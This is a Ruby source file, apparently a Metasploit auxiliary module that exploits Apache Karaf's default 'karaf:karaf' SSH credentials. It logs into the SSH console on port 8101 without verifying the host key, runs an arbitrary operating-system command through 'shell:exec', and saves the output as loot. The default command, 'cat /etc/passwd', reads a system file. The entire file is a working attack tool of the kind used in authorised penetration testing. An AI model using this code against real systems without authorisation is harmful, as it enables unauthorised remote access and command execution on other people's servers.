##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::SSH

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Apache Karaf Default Credentials Command Execution",
      'Description'    => %q{
        This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x.
        The 'karaf' user has a known default password, which can be used to login to the
        SSH service, and execute operating system commands from remote.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Nicholas Starke <nick@alephvoid.com>'
        ],
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Privileged'     => true,
      'DisclosureDate' => "Feb 9 2016"))

    register_options(
      [
        Opt::RPORT(8101),
        OptString.new('USERNAME', [true, 'Username', 'karaf']),
        OptString.new('PASSWORD', [true, 'Password', 'karaf']),
        OptString.new('CMD', [true, 'Command to Run', 'cat /etc/passwd'])
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def cmd
    datastore['CMD']
  end

  def do_login(user, pass, ip)
    factory = ssh_socket_factory
    opts = {
      :auth_methods    => ['password'],
      :port            => rport,
      :config          => false,
      :use_agent       => false,
      :password        => pass,
      :proxy           => factory,
      :non_interactive => true,
      :verify_host_key => :never
    }

    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh = ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, user, opts)
      end
      if ssh
        print_good("#{ip}:#{rport} - Login Successful ('#{user}:#{pass})'")
      else
        print_error "#{ip}:#{rport} - Unknown error"
      end
    rescue OpenSSL::Cipher::CipherError => e
      print_error("#{ip}:#{rport} SSH - Unable to connect to this Apache Karaf (#{e.message})")
      return
    rescue Rex::ConnectionError
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{ip}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{ip}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{ip}:#{rport} SSH - Failed authentication"
    rescue Net::SSH::Exception => e
      print_error "#{ip}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end

    ssh
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Attempt to login...")
    ssh = do_login(username, password, ip)
    if ssh
      output = ssh.exec!("shell:exec #{cmd}\n").to_s
      if output
        print_good("#{ip}:#{rport} - Command successfully executed.  Output: #{output}")
        store_loot("apache.karaf.command",
                "text/plain",
                ip,
                output)
        vprint_status("#{ip}:#{rport} - Loot stored at: apache.karaf.command")
      else
        print_error "#{ip}:#{rport} - Command failed to execute"
      end
    end
  end
end
